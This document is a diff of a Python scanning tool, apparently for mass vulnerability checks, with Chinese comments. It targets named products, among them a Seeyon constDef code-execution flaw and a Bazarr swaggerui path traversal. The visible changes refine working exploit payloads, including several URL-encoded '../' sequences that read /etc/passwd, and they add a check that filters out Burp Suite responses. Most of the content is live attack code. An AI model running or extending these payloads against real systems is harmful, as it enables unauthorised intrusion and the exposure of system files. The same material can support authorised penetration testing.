@@ -4,7 +4,7 @@ import time
 import argparse
 import warnings
 import http.client
-from urllib.parse import urlsplit
+import urllib.parse
 
 warnings.filterwarnings("ignore")
 
@@ -48,7 +48,7 @@ def scan_vuln_3(url):
         response = requests.get(url + payload, timeout=10,verify=False)
         test_url = url + "/1111.jsp"
         test_response = requests.get(test_url, timeout=10,verify=False)
-        if test_response.status_code == 200:
+        if test_response.status_code == 200 and "Burp Suite" not in test_response.text:
             print(f"[+] {url} is vulnerable to Vuln 3 (致远在野 nday constDef 接口存在代码执行漏洞)")
         else:
             print(f"[-] {url} is not vulnerable to Vuln 3")
@@ -260,71 +260,17 @@ def scan_vuln_15(url):
     except requests.exceptions.RequestException as e:
         print(f"[-] {url} request failed: {e}")
 
-# # 漏洞16: Bazarr swaggerui 组件 目录穿越导致任意文件读取漏洞
-# def scan_vuln_16(url):
-#     payload = "/api/swaggerui/static/../../../../../../../../../../../../../../../../etc/passwd"
-#     try:
-#         response = requests.get(url + payload, timeout=10,verify=False)
-#         if "root:" in response.text:
-#             print(f"[+] {url} is vulnerable to Vuln 16 (Bazarr swaggerui 组件 目录穿越导致任意文件读取漏洞)")
-#         else:
-#             print(f"[-] {url} is not vulnerable to Vuln 16")
-#     except requests.exceptions.RequestException as e:
-#         print(f"[-] {url} request failed: {e}")
+# 漏洞16: Bazarr swaggerui 组件 目录穿越导致任意文件读取漏洞
 def scan_vuln_16(url):
-    payload = "/api/swaggerui/static/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd"
-    full_url = url + payload
-
-    # 创建一个Session
-    session = Session()
-
-    # 使用PreparedRequest来构建请求
-    req = Request('GET', full_url)
-    prepped = session.prepare_request(req)
-
+    payload = "/api/swaggerui/static/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd"
     try:
-        # 发送请求
-        response = session.send(prepped, timeout=10, verify=False)
+        response = requests.get(url + payload, timeout=10,verify=False)
         if "root:" in response.text:
             print(f"[+] {url} is vulnerable to Vuln 16 (Bazarr swaggerui 组件 目录穿越导致任意文件读取漏洞)")
         else:
             print(f"[-] {url} is not vulnerable to Vuln 16")
     except requests.exceptions.RequestException as e:
         print(f"[-] {url} request failed: {e}")
-# # 漏洞16: Bazarr swaggerui 组件 目录穿越导致任意文件读取漏洞
-# def scan_vuln_16(url):
-#     payload = "/api/swaggerui/static/../../../../../../../../../../../../../../../../etc/passwd"
-    
-#     # 解析URL
-#     parsed_url = urlsplit(url)
-#     hostname = parsed_url.hostname
-#     port = parsed_url.port if parsed_url.port else 80
-#     scheme = parsed_url.scheme
-#     path = parsed_url.path
-
-#     # 构建完整的请求路径
-#     full_path = path + payload
-
-#     # 根据scheme选择HTTP或HTTPS连接
-#     if scheme == "https":
-#         connection = http.client.HTTPSConnection(hostname, port, timeout=10)
-#     else:
-#         connection = http.client.HTTPConnection(hostname, port, timeout=10)
-
-#     try:
-#         # 发送请求
-#         connection.request("GET", full_path, headers={"Host": hostname})
-#         response = connection.getresponse()
-#         response_data = response.read().decode('utf-8')
-#         connection.close()
-
-#         # 检查响应内容
-#         if "root:" in response_data:
-#             print(f"[+] {url} is vulnerable to Vuln 16 (Bazarr swaggerui 组件 目录穿越导致任意文件读取漏洞)")
-#         else:
-#             print(f"[-] {url} is not vulnerable to Vuln 16")
-#     except Exception as e:
-#         print(f"[-] {url} request failed: {e}")
 
 
 # 漏洞17: 泛微 e-cology9 /services/WorkPlanService 前台 SQL 注入
